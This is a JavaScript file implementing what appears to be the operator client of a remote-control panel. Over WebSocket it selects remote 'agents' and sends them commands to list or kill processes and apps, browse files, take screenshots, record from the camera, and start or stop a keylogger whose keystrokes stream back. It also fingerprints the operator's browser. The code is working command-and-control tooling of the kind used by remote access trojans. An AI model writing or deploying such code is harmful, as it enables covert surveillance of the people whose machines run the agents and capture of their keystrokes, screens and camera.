import { CONFIG } from './config.js';

export class Gateway{
    /**
     * @param {Object} callbacks
     * @param {Function} callbacks.onConnected
     * @param {Function} callbacks.onDisconnected
     * @param {Function} callbacks.onMessage
     * @param {Function} callbacks.onError 
     * @param {Function} callbacks.onAuthSuccess 
     * @param {Function} callbacks.onAgentListUpdate
     * @param {Function} callbacks.onScreenshot     
     * @param {Function} callbacks.onCamera        
     * @param {Function} callbacks.onKeylog         
     * @param {Function} callbacks.onMessage
     */

    constructor(callbacks = {}) {
        this.ws = null;
        this.callbacks = callbacks;
        this.isAuthenticated = false;
        this.machineId = null; // Will be set asynchronously
        this.targetId = 'ALL';
        this._lastCloseCode = null; // Track last close code to prevent reconnect loops

        this.ui = window.ui || { log: console.log, renderList: console.table };

        this.agentsList = [];
        this.appsList = [];
        this.processesList = [];
        this._rawAppsList = [];
        this._rawProcessesList = [];
        
        // Initialize machineId asynchronously
        this._getMachineId().then(id => {
            this.machineId = id;
        }).catch(() => {
            // Fallback to sync method if async fails
            this.machineId = this._getMachineIdSync();
        });
    }
    
    _getMachineIdSync() {
        let id = localStorage.getItem(CONFIG.LOCAL_STORAGE_ID_KEY);
        if (!id) {
            const hostname = window.location.hostname || 'localhost';
            const userAgent = navigator.userAgent || 'unknown';
            const platform = navigator.platform || 'unknown';
            
            const hash = this._simpleHash(hostname + userAgent + platform);
            const shortHash = hash.toString(36).substring(0, 8).toUpperCase();
            
            id = `CLI-${hostname}-${shortHash}`;
            id = id.replace(/[^a-zA-Z0-9\-_]/g, '-').substring(0, 50);
            localStorage.setItem(CONFIG.LOCAL_STORAGE_ID_KEY, id);
        }
        return id;
    }

    findAgentId(input) {
        if (input === 'ALL') return 'ALL';
        
        const agent = this.agentsList.find(a => 
            a.id === input || 
            a.ip === input || 
            a.machineId === input
        );

        return agent ? agent.id : null;
    }

    async _getMachineId() {
        let id = localStorage.getItem(CONFIG.LOCAL_STORAGE_ID_KEY);
        if (!id) {
            // Try to get hardware-based unique ID
            try {
                // Use Web Crypto API to generate a persistent ID based on hardware
                const hardwareInfo = await this._getHardwareFingerprint();
                id = `CLI-${hardwareInfo}`;
                id = id.replace(/[^a-zA-Z0-9\-_]/g, '-').substring(0, 50);
                localStorage.setItem(CONFIG.LOCAL_STORAGE_ID_KEY, id);
            } catch (error) {
                // Fallback to hash-based method
                const hostname = window.location.hostname || 'localhost';
                const userAgent = navigator.userAgent || 'unknown';
                const platform = navigator.platform || 'unknown';
                const language = navigator.language || 'unknown';
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
                
                const hash = this._simpleHash(hostname + userAgent + platform + language + timezone);
                const shortHash = hash.toString(36).substring(0, 12).toUpperCase();
                
                id = `CLI-${hostname}-${shortHash}`;
                id = id.replace(/[^a-zA-Z0-9\-_]/g, '-').substring(0, 50);
                localStorage.setItem(CONFIG.LOCAL_STORAGE_ID_KEY, id);
            }
        }
        return id;
    }

    async _getHardwareFingerprint() {
        // Collect hardware/software characteristics
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Hardware fingerprint', 2, 2);
        
        const canvasFingerprint = canvas.toDataURL();
        const screenInfo = `${screen.width}x${screen.height}x${screen.colorDepth}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const language = navigator.language;
        const platform = navigator.platform;
        const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
        const deviceMemory = navigator.deviceMemory || 'unknown';
        
        // Combine all hardware characteristics
        const fingerprint = `${canvasFingerprint}-${screenInfo}-${timezone}-${language}-${platform}-${hardwareConcurrency}-${deviceMemory}`;
        
        // Create a hash using Web Crypto API
        const encoder = new TextEncoder();
        const data = encoder.encode(fingerprint);
        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        
        // Return first 24 characters (12 bytes) as hex string
        return hashHex.substring(0, 24).toUpperCase();
    }

    _simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash);
    }

    connect(ip, port = CONFIG.SERVER_PORT, useSecure = false) {
        if (this.ws) {
            this.ws.close();
            this.ws = null;
        }
        
        // Auto-detect: port 8082 = WS, port 8080 = WSS
        if (port === 8080) {
            useSecure = true;
        } else if (port === 8082) {
            useSecure = false;
        }
        
        const protocol = useSecure ? 'wss' : 'ws';
        const url = `${protocol}://${ip}:${port}`;

        this.ws = new WebSocket(url);

        this.ws.onopen = () => {
            // Ensure machineId is ready before sending auth
            const machineId = this.machineId || this._getMachineIdSync();
            this.send(
                CONFIG.CMD.AUTH, {
                    pass: CONFIG.AUTH_HASH,
                    role: 'CLIENT',
                    machineId: machineId
                }
            );
        };

        this.ws.onmessage = (event) => this._handleInternalMessage(event);
        
        this.ws.onclose = (event) => {
            const wasAuthenticated = this.isAuthenticated;
            const connectionId = this.clientConnectionId || 'none';
            this._lastCloseCode = event.code;
            this.isAuthenticated = false;
            
            // Code 1001 = Going Away (normal closure, e.g., page refresh, tab close)
            // Code 1000 = Normal Closure
            // Code 1006 = Abnormal Closure (no close frame)
            // Code 1005 = No Status Received
            
            if (event.code === 1001 || event.code === 1000) {
                // Intentional close - don't reconnect
                return;
            }
            
            // For other close codes, only trigger onDisconnected if we were authenticated
            // This prevents reconnect loops when connection fails before authentication
            if (wasAuthenticated && this.callbacks.onDisconnected) {
                this.callbacks.onDisconnected();
            }
        };

        this.ws.onerror = (err) => {
            console.error(`[Network] WebSocket error:`, err);
            console.error(`[Network] Cannot connect to ${url}`);
            console.error(`[Network] Possible causes:`);
            console.error(`  - Gateway server is not running`);
            if (useSecure) {
                console.error(`  - SSL certificate is not trusted (self-signed certificate)`);
                console.error(`  - Solution: Open https://${ip}:${port} in browser first to accept the certificate`);
            }
            console.error(`  - Firewall blocking connection`);
            if (this.callbacks.onError) {
                this.callbacks.onError(err);
            }
        };
    }

    disconnect() {
        if (this.ws) this.ws.close();
    }

    authenticate() {
        const machineId = this.machineId || this._getMachineIdSync();
        console.log(`[Gateway] Authenticating as CLIENT with machineId: ${machineId}`);
        this.send(CONFIG.CMD.AUTH, {
            pass: CONFIG.AUTH_HASH,
            role: 'CLIENT',
            machineId: machineId
        });
    }

    send(type, data, specificTarget = null) {
        if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
            console.warn(`[Gateway] Cannot send: Socket not open.`);
            return;
        }

        if (type === CONFIG.CMD.AUTH) {
            this.ws.send(JSON.stringify({type, data}));
            return;
        }

        const payload = {
            type: type,
            data: data,
            from: this.sessionId,
            to: specificTarget || this.targetId
        }

        this.ws.send(JSON.stringify(payload));
    }

    setTarget(input) {
        const realId = this.findAgentId(input);
        
        if (realId) {
            this.targetId = realId;
            console.log(`[Gateway] Target locked: ${realId} (Matched: ${input})`);
        } else {
            console.warn(`[Gateway] Could not find agent with Name/IP/ID: ${input}`);
            console.log("Available Agents:", this.agentsList);
        }
    }

    refreshAgents() {
        this.send(CONFIG.CMD.GET_AGENTS, {});
    }

    fetchProcessList() {
        this.send(CONFIG.CMD.PROC_LIST, "");
    }

    startProcess(id) {
        this.send(CONFIG.CMD.PROC_START, String(id));
    }

    killProcess(id) {
        this.send(CONFIG.CMD.PROC_KILL, String(id));
    }

    fetchAppList() {
        this.send(CONFIG.CMD.APP_LIST, "");
    }

    startApp(id) {
        this.send(CONFIG.CMD.APP_START, String(id));
    }

    killApp(id) {
        this.send(CONFIG.CMD.APP_KILL, String(id));
    }

    listFiles(path = "") {
        const data = typeof path === 'string' ? path : JSON.stringify({ path });
        this.send(CONFIG.CMD.FILE_LIST, data);
    }

    _handleInternalMessage(event) {
        try {
            let msg;
            try { msg = JSON.parse(event.data); } 
            catch { msg = { type: 'raw', data: event.data }; }
            const senderId = msg.from;

            switch (msg.type) {
                case CONFIG.CMD.AUTH:
                    if (msg.data && msg.data.status === 'ok') {
                        this.isAuthenticated = true;
                        this.clientConnectionId = msg.data.sessionId;
                        console.log(`[Gateway] Authentication successful! Session: ${this.clientConnectionId}`);
                        this.ui.log('Auth', `Success! Connected as: ${this.clientConnectionId}`, 'info');
                        if (this.callbacks.onAuthSuccess) this.callbacks.onAuthSuccess();
                        this.refreshAgents();
                    } else {
                        console.error(`[Gateway] Auth Failed:`, msg.data);
                        if (msg.data && msg.data.msg) {
                            console.error(`[Gateway] Error message: ${msg.data.msg}`);
                        }
                    }
                    break;
                case CONFIG.CMD.GET_AGENTS:
                    console.log('[Gateway] Received GET_AGENTS response:', msg.data);
                    this.agentsList = msg.data;
                    if (this.callbacks.onAgentListUpdate) {
                        console.log('[Gateway] Calling onAgentListUpdate callback');
                        this.callbacks.onAgentListUpdate(msg.data);
                    } else {
                        console.warn('[Gateway] onAgentListUpdate callback not defined');
                    }
                    break;
                case CONFIG.CMD.PROC_LIST:
                    if (msg.data && msg.data.status === 'ok' && msg.data.processes) {
                        // Format processes for display
                        const formattedProcs = DataFormatter.formatProcessList(msg.data.processes);
                        this.processesList = formattedProcs;
                        this.ui.renderList("PROCESSES", formattedProcs);
                        
                        // Store raw data for search
                        this._rawProcessesList = msg.data.processes;
                        
                        // Trigger callback if available
                        if (this.callbacks.onProcessListUpdate) {
                            this.callbacks.onProcessListUpdate(formattedProcs);
                        }
                    } else {
                        this.ui.log('Error', msg.data?.msg || 'Failed to fetch processes');
                    }
                    break;
                case CONFIG.CMD.APP_LIST:
                    if (msg.data && msg.data.status === 'ok' && msg.data.apps) {
                        // Format apps for display
                        const formattedApps = DataFormatter.formatAppList(msg.data.apps);
                        this.appsList = formattedApps;
                        this.ui.renderList("APPLICATIONS", formattedApps);
                        
                        // Store raw data for search
                        this._rawAppsList = msg.data.apps;
                        
                        // Trigger callback if available
                        if (this.callbacks.onAppListUpdate) {
                            this.callbacks.onAppListUpdate(formattedApps);
                        }
                    } else {
                        this.ui.log('Error', msg.data?.msg || 'Failed to fetch apps');
                    }
                    break;
                case CONFIG.CMD.FILE_LIST:
                    if (msg.data && msg.data.status === 'ok' && msg.data.files) {
                        this.ui.renderFileList(msg.data.path, msg.data.files, msg.data.count);
                    } else {
                        this.ui.log('Error', msg.data?.msg || 'Failed to list files');
                    }
                    break;
                case CONFIG.CMD.PROC_START:
                case CONFIG.CMD.PROC_KILL:
                case CONFIG.CMD.APP_START:
                case CONFIG.CMD.APP_KILL:
                case CONFIG.CMD.START_KEYLOG:
                case CONFIG.CMD.STOP_KEYLOG:
                    this._handleCommandResult(msg.type, msg.data);
                    break;
                case CONFIG.CMD.SCREENSHOT:
                    if (msg.data && msg.data.status === 'ok') {
                        if (this.callbacks.onScreenshot) {
                            this.callbacks.onScreenshot(msg.data.data, senderId);
                        }
                        if (typeof MediaPreview !== 'undefined') {
                            MediaPreview.showImagePreview(msg.data.data, `Screenshot from ${senderId}`);
                        }
                    }
                    break;
                case CONFIG.CMD.CAM_RECORD:
                    if (msg.data && msg.data.status === 'ok') {
                        if (this.callbacks.onCamera) {
                            this.callbacks.onCamera(msg.data.data, senderId);
                        }
                        if (typeof MediaPreview !== 'undefined') {
                            MediaPreview.showVideoPreview(msg.data.data, `Camera Recording from ${senderId}`);
                        }
                    }
                    break;
                case CONFIG.CMD.STREAM_DATA:
                    if (msg.data && msg.data.data) {
                        if (this.callbacks.onKeylog) {
                            this.callbacks.onKeylog(msg.data.data, senderId);
                        }
                    }
                    break;
                case CONFIG.CMD.ERROR:
                    console.error("[Gateway] Server Error:", msg.data);
                    const errorMsg = typeof msg.data === 'string' ? msg.data : (msg.data?.msg || JSON.stringify(msg.data));
                    this.ui.log('Error', errorMsg);
                    if (errorMsg.includes('Authentication') || errorMsg.includes('password') || errorMsg.includes('login')) {
                        console.error("[Gateway] Authentication failed - connection will be closed");
                        console.error("[Gateway] Check AUTH_HASH in config.js matches AUTH_SECRET in Gateway");
                    }
                    break;
                default:
                    this.ui.log('Server', JSON.stringify(msg.data));
                    if(this.callbacks.onMessage) {
                    this.callbacks.onMessage(msg);
            }
            }

        } catch (e) {
            console.error('[Gateway] Error handling message: ', e);
        }
    }

    _handleCommandResult(type, data) {
        const isSuccess = data.status === 'ok';
        const logMsg = `${type}: ${data.msg} (ID: ${data.id || 'N/A'})`;

        if (isSuccess) {
            console.log(`[Success] ${logMsg}`);
            this.ui.log('System', data.msg);

            if (type.includes("APP")) this.fetchAppList();
            if (type.includes("PROC")) this.fetchProcessList();
        } else {
            console.warn(`[Failed] ${logMsg}`);
            this.ui.log('Error', data.msg);
        }
    }
}